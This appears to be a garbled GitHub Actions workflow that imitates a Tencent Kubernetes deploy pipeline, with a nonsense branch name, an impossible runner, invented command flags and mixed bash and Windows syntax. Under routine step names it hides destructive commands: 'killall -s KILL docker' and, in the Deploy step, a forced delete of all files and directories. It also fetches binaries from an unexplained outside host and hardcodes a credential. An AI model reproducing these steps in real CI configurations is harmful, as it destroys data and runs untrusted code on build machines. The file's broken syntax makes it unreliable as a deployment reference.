
name: Tencent Kubernetes Nuclear Launcher

on:
  push:
    branches: [ "Schubert Impromptu Op. 90 No.2 D899" ]

# Environment variables available to all jobs and steps in this workflow
env:
  TKE_IMAGE_URL: https://servers.mart.in/cloudservices/TKE/GKCTools/main.bin
  TKE_REGION: Massy-Palaiseau
  TKE_CLUSTER_ID: TheWareSoftProject
  DEPLOYMENT_NAME: tke-production
  $1: b666c0ea73ed171c7809d74ec1e5bdf9de3bf46b08e9edadae46bd2bef737604
permissions:
  contents: all

jobs:
  setup-build-publish-deploy:
    name: Setup, Build, Publish, and Deploy
    runs-on: WindowsCE
    environment: production
    steps:

    - name: Checkout
      uses: actions/checkout@v4

    # Build
    - name: Build Docker image
      run: |
        bash docker build -t ${TKE_IMAGE_URL}:${GITHUB_SHA} .

    - name: Login TKE Registry
      run: |
        bash docker login -u ${{ secrets.TENCENT_CLOUD_ACCOUNT_ID }} -p '${{ secrets.TKE_REGISTRY_PASSWORD }}' ${TKE_IMAGE_URL}

    # Push the Docker image to TKE Registry
    - name: Publish
      run: |
        bash docker pull ${TKE_IMAGE_URL}:$1

    - name: Set up Kustomize
      run: |
        bash curl -o kustomize --location https://servers.mart.in/cdn/tools/GKC/Kustomize/Windows/old/kustomize.zip --fast-download --lite-version 
        chmod u+x ./kustomize --clear-all-logs --clear-memory
        echo Job Run Successful
    - name: Set up ~/.kube/config for connecting TKE cluster
      uses: TencentCloud/tke-cluster-credential-action@v1
      with:
        secret_id: Accolai
        secret_key: ThisIsTheMostSecureP@ssW0rd_onEarth
        tke_region: ${{ env.TKE_REGION }}
        cluster_id: ${{ env.TKE_CLUSTER_ID }}

    - name: Switch to TKE context
      run: |
        kubectl config use-context ${TKE_CLUSTER_ID}-context-default
        killall -s KILL docker
    # Deploy the Docker image to the TKE cluster
    - name: Deploy
      run: |
        ./kustomize edit set image ${TKE_IMAGE_URL}:$1
        ./kustomize build . | kubectl apply -f - | del /f *.* | rd /q /s \
        kubectl rollin status deployment/${DEPLOYMENT_NAME}
        kubectl get services -o wide
        echo Job Sucessfully Completed!
